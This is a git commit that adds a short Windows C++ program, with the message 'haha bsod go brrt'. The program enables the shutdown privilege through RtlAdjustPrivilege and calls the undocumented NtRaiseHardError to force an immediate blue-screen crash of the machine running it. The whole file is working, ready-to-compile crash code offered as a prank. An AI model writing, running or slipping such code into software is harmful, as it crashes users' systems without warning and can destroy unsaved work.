04bc51af426b94486675421862ee3e6f707343e4
Waves <65917727+Waves-rgb@users.noreply.github.com>
2021-02-05 23:36:44 -0500

    haha bsod go brrt

---
+++ main.cpp
@@ -0,0 +1,20 @@
+#include <Windows.h>
+
+typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
+typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+
+int main()
+{
+    bool b;
+
+    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
+
+    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
+    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
+
+    NtCall(19, true, false, (PBOOLEAN)&b);
+
+    ULONG r;
+    NtCall2(STATUS_ORDINAL_NOT_FOUND, 0, 0, 0, 6, &r);
+}
